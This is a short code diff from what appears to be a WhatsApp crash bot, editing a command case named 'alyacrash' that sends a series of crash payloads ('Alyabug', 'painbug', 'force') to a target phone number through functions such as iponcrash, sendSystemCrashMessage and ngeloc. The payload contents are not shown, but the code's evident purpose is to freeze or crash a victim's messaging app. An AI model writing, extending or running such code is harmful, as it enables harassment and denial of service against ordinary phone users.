@@ -21294,12 +21294,12 @@ case "alyacrash": {
         await bakdok(whatsappNumber, Alyabug);
          // Random delay between 2 
         await sendPaymentInfoMessage(whatsappNumber, Alyabug);
-        await penghitaman(whatsappNumber, painbug);
+        await penghitaman(whatsappNumber, painbug, Alyabug);
         await iponcrash(whatsappNumber, force);
         await sendSystemCrashMessage(whatsappNumber, force);
         await sendPaymentInfoMessage(whatsappNumber, painbug);
-        await ngeloc(whatsappNumber, force2);
-        await ngeloc(whatsappNumber, painbug);
+        await sendSystemCrashMessage(whatsappNumber, force2, painbug);
+        await ngeloc(whatsappNumber, force2, painbug);
 
          if (j === 1) {
             // Additional logic if needed
